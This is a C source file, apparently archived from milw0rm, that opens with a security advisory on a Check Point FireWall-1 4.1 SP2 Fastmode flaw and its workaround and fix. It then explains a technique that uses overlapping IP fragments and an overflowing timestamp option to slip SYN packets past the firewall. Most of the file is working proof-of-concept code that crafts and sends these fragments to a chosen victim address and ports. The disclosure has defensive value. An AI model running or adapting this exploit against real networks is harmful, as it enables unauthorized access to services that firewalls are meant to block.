/*

  Summary
  A vulnerability exists in Check Point VPN-1/FireWall-1 4.1 SP2 that enables
  an attacker to establish connections to blocked TCP services through the
  firewall in certain configurations. 

  We expect many deployed FireWall-1 installations to be immune to this attack.
  But we think that the beauty inherent to the applied exploit technique would
  justify an advisory by itself. 

  Fix Information
  Workaround
  Disable the Fastmode property for all protocols.

  Note: Fastmode is disabled by default, and is enabled only if the firewall
        administrator has specifically changed the TCP property for a protocol.
        To verify this setting, select a protocol from the "Manage->Services"
        menu in the Policy Editor by double-clicking on the protocol or clicking
        the "Edit" button. Make sure the "FastMode" box at the bottom of the TCP
        Service Properties window is not checked.

  Disabling Fastmode removes all known vulnerabilities.

  Official Fix
  This vulnerability is fixed in VPN-1/FireWall-1 4.1 SP3, which is available now.

  Thanks
  We would like to thank Check Point Software Technologies Ltd. for their quick
  and competent response to this problem and their co-operation on this advisory.
  We would also like to thank John McDonald and Dug Song for inspiration on the
  idea of adding invalid IP options to datagrams.

  Impact
  In a nutshell
  If we use Fastmode and allow access to a single TCP service, all TCP services
  on the same machine become accessible. In addition, all TCP services on machines
  that are at least one hop away from the firewall become accessible, too, if these
  machines are located behind the same firewall interface as the machine mentioned
  above.

  That means, for example, that once you open a service in your DMZ to the Internet,
  all services in the DMZ may become accessible to the Internet. And once you open
  a service in your intranet to the DMZ (suppose the web server needs to access a
  DBMS or the mail server has to forward mail to the intranet), all services in the
  intranet may become accessible to the DMZ.

  Thus, an attacker might be able to work his way from the Internet through the
  DMZ to the intranet.

  Depending on your topology, this problem can be harmless or fatal.

  In full detail
  Connections to arbitrary TCP services at an IP address X can be established, if 
  1) at least one service in the rulebase is a Fastmode service 
  AND

  2) either of the following two conditions is satisfied.

  2.1) The rulebase grants the attacker legitimate access to at least one TCP
       service at address X. 
  OR

  2.2) The following three conditions are satisfied.

  2.2.a) The rulebase grants the attacker legitimate access to at least one TCP
          service at an arbitrary address Y 
  AND

  2.2.b) address X is at least one hop away from the firewall 
  AND


  2.2.c) address X is located behind the same firewall interface as address Y. 
  Details
  As we know, if a certain service is defined to be a Fastmode service, then all
  non-SYN packets with a source or destination port equal to the Fastmode service
  will be accepted by the firewall. Only SYN packets are still passed through the
  inspection engine.
  Version 4.1 SP2 does not include a minimal length check for the first fragment
  of a TCP packet anymore. Instead, when examining TCP ports and TCP flags, it
  copies the TCP header from the linked list of fragments to a contiguous memory
  buffer. Thus, if we fragment the 20 byte TCP header into three 8 byte + 8 byte
  + 4 byte fragments, FW-1 will still interpret the TCP header correctly. This
  is the major difference to prior versions. In prior versions, the inspection
  engine made sure that the first fragment had a length of at least 40 bytes and
  then performed the rulebase checks (TCP ports, TCP flags) directly in the mbuf
  of the first fragment. No copying.

  What can we do with this? As stated above, the attack needs two things in order
  to succeed: a) a Fastmode service and b) an open port at a certain IP address.
  Let us assume that we have a web server with port 80 open to the public. Suppose
  that the administrator has made port 80 a Fastmode service, in order to improve
  firewall performance.

  We now send two fragmented TCP packets, packet A and packet B. Fragment #1 of
  these packets contains the first 8 bytes of the respective TCP header, fragment
  #2 contains the next 8 bytes, and fragment #3 contains the remaining 4 bytes.

  Packet A is an ACK packet with a source port equal to the Fastmode service,
  i.e. a source port of 80. The destination port of this packet is the blocked
  service that we want to get a SYN to. Let us assume it is 32775. Suppose A1,
  A2 and A3 are the three fragments of packet A. They now contain the following
  information.

  A1: ports (80 -> 32775)
  A2: flags (ACK)
  A3: ...

  This packet will be accepted, because the source port is a Fastmode service
  and it is not a SYN packet.

  Packet B is a SYN packet with a non-privileged source port, e.g. 1024. The
  destination port of this packet is the service which is open to the outside
  world, i.e. 80. So, the fragments of packet B contain the following
  information.

  B1: ports (1024 -> 80)
  B2: flags (SYN)
  B3: ...

  This fragment will be accepted, because it is accepted by the rulebase.

  For both fragment sets we choose the same IP id. And what we want to end
  up with is that the destination host of the fragments drops A2, B1, and
  B3. Because then the firewall will accept two harmless packets that will
  be combined into a single not so harmless packet at the destination, as in

  A1: ports (80 -> 32775)
  B2: flags (SYN)
  A3: ...

  So, we have to somehow malform A2, B1, and B3. However, the fragments must
  not be malformed when we send them. Otherwise the intermediate routers
  between us and the final destination would detect the malformation and
  drop our fragments. Therefore we use a timestamp IP option that will
  overflow right at the destination host. In this way, all intermediate
  routers between us and the destination will see intact packets with a
  valid timestamp option. The destination, however, will see that the
  timestamp IP option has been completely used up by the previous hop and
  thus consider the option to be invalid and drop the fragment.

  We can do this for any non-first fragment. For first fragments FW-1
  ensures that they start with 0x45, i.e. that they do not contain any
  options.

  Now we can make the destination drop A2 and B3. And with BSD semantics,
  a second fragment that has the same offset as a fragment in the
  reassembly queue will be overlapped by the fragment in the reassembly
  queue, i.e. it will potentially be discarded. Hence, if we send packet
  A before packet B, B1 will be dropped because A1 already exists in the
  reassembly queue and has the same offset and length.

  For destination hosts which overlap fragments the other way around, we
  would have to send packet B before packet A.

  And that is basically it. We sneak a SYN through the firewall from a
  Fastmode port to any other port at the same IP address as the port
  that is open to the outside. All remaining non-SYNs will be accepted,
  because they contain a Fastmode service as their source port (our
  packets) or destination port (reply packets).

  To extend the attack to hosts that are at least one hop away from the
  firewall, we can use source routing to have the hop behind the firewall
  rewrite the destination address of fragment B2 to anything we want. Thus
  we can redirect the SYN fragment to any IP address after it has passed
  the firewall.

  We have attached pretty ugly demonstration source code for Linux.
  Depending on what you do with it, it might need a little patching
  of the anti-spoofing parts of your kernel to work properly. It seems
  that anti-spoofing for local addresses cannot be disabled in /proc.
  Consider it to be proof of concept code.

  The extension to attack other hosts that are at least one hop away from
  the firewall is not implemented in the code.

  Demonstration Source Code Below:
*/


#define _BSD_SOURCE

#include <net/ethernet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>

struct pseudo {
  unsigned long source;
  unsigned long dest;
  unsigned char zero;
  unsigned char proto;
  unsigned short len;
};

/*
 *      -------------------- config --------------------
 */

static char tap_device[] = "/dev/tap0";

static char local_ip_addr[] = "172.16.0.1";

static unsigned char dst_mac_addr[] = {
  0xfe, 0xfd, 0x00, 0x00, 0x00, 0x00
};

static int num_hops = 1;

/*
 *     ------------------------------------------------
 */

static void hex_dump(unsigned char *buff, int len)
{
  int i, k;

  for (i = 0; i < len; i += k) {
    printf("%.4x: ", i);
    for (k = 0; i + k < len && k < 16; k++)
      printf("%.2x ", buff[i + k]);
    while (k++ < 16)
      printf("   ");
    for (k = 0; i + k < len && k < 16; k++)
      if (buff[i + k] >= 32 && buff[i + k] <= 126)
	printf("%c", buff[i + k]);
      else
	printf(".");
    printf("\n");
  }
}

int full_write(int f, char *data, int len)
{
  int res;

  while (len > 0) {
    if ((res = write(f, data, len)) < 0)
      return res;
    len -= res;
    data += res;
  }

  return 0;
}

static u_short calc_sum(u_short start, u_short *buff, int bytelen)
{
  u_long sum = start;
  u_short last = 0;
  int wordlen;

  wordlen = bytelen / 2;
  bytelen &= 1;

  while (wordlen--)
    sum += *buff++;

  if (bytelen) {
    *((u_char *)&last) = *((u_char *)buff);
    sum += last;
  }

  sum = (sum >> 16) + (sum & 0xffff);
  sum = (sum >> 16) + (sum & 0xffff);

  return sum;
}

static void usage()
{
  fprintf(stderr, "usage: frag v-addr f-port o-port v-port\n");
}

int main(int ac, char *av[])
{
  int t;
  unsigned char dgram[136];
  struct ether_header eh;
  unsigned char iph_buff[60];
  struct ip *iph;
  unsigned char tcph_buff[60];
  struct tcphdr *tcph;
  unsigned long la, va;
  unsigned short fp, op, vp;
  struct pseudo ph;
  unsigned short fid;

  if (ac != 5) {
    usage();
    return 1;
  }

  if ((va = inet_addr(av[1])) == (unsigned long)-1) {
    fprintf(stderr, "invalid victim address given\n");
    usage();
    return 1;
  }

  if (!(fp = htons(atoi(av[2])))) {
    fprintf(stderr, "invalid fastmode port given\n");
    usage();
    return 1;
  }

  if (!(op = htons(atoi(av[3])))) {
    fprintf(stderr, "invalid open port given\n");
    usage();
    return 1;
  }

  if (!(vp = htons(atoi(av[4])))) {
    fprintf(stderr, "invalid victim port given\n");
    usage();
    return 1;
  }

  la = inet_addr(local_ip_addr);

  fid = (unsigned short)getpid();

  iph = (struct ip *)iph_buff;
  tcph = (struct tcphdr *)tcph_buff;

  if ((t = open(tap_device, O_RDWR)) < 0) {
    perror("open");
    return 2;
  }

  /*
   *      -------------------- PACKET #1 --------------------
   */

  ph.source = la;
  ph.dest = va;
  ph.zero = 0;
  ph.proto = IPPROTO_TCP;
  ph.len = htons(20);

  tcph->th_sport = fp;
  tcph->th_dport = vp;
  tcph->th_seq = htonl(0x19711219);
  tcph->th_ack = htonl(0x19720201);
  tcph->th_x2 = 0;
  tcph->th_off = 5;
  tcph->th_win = htons(16384);
  tcph->th_urp = htons(0);

  tcph->th_flags = TH_SYN;

  /*
   *      Must be the "with SYN" checksum. The ACK will be overwritten
   *      by the second packet.
   */

  tcph->th_sum = 0;
  tcph->th_sum = ~calc_sum(calc_sum(0, (u_short *)&ph, 12),
			  (u_short *)tcph, ntohs(ph.len));

  tcph->th_flags = TH_ACK;

  iph->ip_v = IPVERSION;
  iph->ip_tos = 0;
  iph->ip_id = htons(fid);
  iph->ip_ttl = 64;
  iph->ip_p = IPPROTO_TCP;
  iph->ip_src.s_addr = la;
  iph->ip_dst.s_addr = va;

  memcpy(eh.ether_dhost, dst_mac_addr, 6);
  memset(eh.ether_shost, 0, 6);
  eh.ether_type = htons(ETHERTYPE_IP);

  dgram[0] = dgram[1] = 0;
  memcpy(dgram + 2, &eh, 14);

  /*
   *      ---------- Fragment #1 ----------
   */

  iph->ip_hl = 5;
  iph->ip_len = htons(28);
  iph->ip_off = htons(IP_MF);
  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 20);

  memcpy(dgram + 16, iph_buff, 20);
  memcpy(dgram + 36, tcph_buff, 8);

  hex_dump(dgram, 44); printf("\n");

  if (full_write(t, dgram, 44) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      ---------- Fragment #2 ----------
   */

  iph->ip_hl = 6;
  iph->ip_len = htons(32);
  iph->ip_off = htons(1 | IP_MF);

  iph_buff[20] = 68;
  iph_buff[21] = 4;
  iph_buff[22] = 5;
  iph_buff[23] = (15 - num_hops) << 4;

  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 24);

  memcpy(dgram + 16, iph_buff, 24);
  memcpy(dgram + 40, tcph_buff + 8, 8);

  hex_dump(dgram, 48); printf("\n");


  if (full_write(t, dgram, 48) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      ---------- Fragment #3 ----------
   */

  iph->ip_hl = 6;
  iph->ip_len = htons(28);
  iph->ip_off = htons(2);

  iph_buff[20] = 1;
  iph_buff[21] = 1;
  iph_buff[22] = 1;
  iph_buff[23] = 1;

  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 24);

  memcpy(dgram + 16, iph_buff, 24);
  memcpy(dgram + 40, tcph_buff + 16, 4);

  hex_dump(dgram, 44); printf("\n");

  if (full_write(t, dgram, 44) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      -------------------- PACKET #2 --------------------
   */

  getchar();

  tcph->th_sport = htons(1024);
  tcph->th_dport = op;
  tcph->th_flags = TH_SYN;

  /*
   * But then again, the fragment with the checksum will be dropped anyway...
   */

  tcph->th_sum = 0;
  tcph->th_sum = ~calc_sum(calc_sum(0, (u_short *)&ph, 12),
			  (u_short *)tcph, ntohs(ph.len));

  /*
   *      ---------- Fragment #1 ----------
   */

  iph->ip_hl = 5;
  iph->ip_len = htons(28);
  iph->ip_off = htons(IP_MF);
  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 20);

  memcpy(dgram + 16, iph_buff, 20);
  memcpy(dgram + 36, tcph_buff, 8);

  hex_dump(dgram, 44); printf("\n");

  if (full_write(t, dgram, 44) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      ---------- Fragment #2 ----------
   */

  iph->ip_hl = 6;
  iph->ip_len = htons(32);
  iph->ip_off = htons(1 | IP_MF);

  iph_buff[20] = 1;
  iph_buff[21] = 1;
  iph_buff[22] = 1;
  iph_buff[23] = 1;

  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 24);

  memcpy(dgram + 16, iph_buff, 24);
  memcpy(dgram + 40, tcph_buff + 8, 8);

  hex_dump(dgram, 48); printf("\n");


  if (full_write(t, dgram, 48) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  /*
   *      ---------- Fragment #3 ----------
   */

  iph->ip_hl = 6;
  iph->ip_len = htons(28);
  iph->ip_off = htons(2);

  iph_buff[20] = 68;
  iph_buff[21] = 4;
  iph_buff[22] = 5;
  iph_buff[23] = (15 - num_hops) << 4;

  iph->ip_sum = 0;
  iph->ip_sum = ~calc_sum(0, (u_short *)iph, 24);

  memcpy(dgram + 16, iph_buff, 24);
  memcpy(dgram + 40, tcph_buff + 16, 4);

  hex_dump(dgram, 44); printf("\n");

  if (full_write(t, dgram, 44) < 0) {
    perror("write");
    close(t);
    return 3;
  }

  close(t);

  return 0;
}

// milw0rm.com [2000-12-19]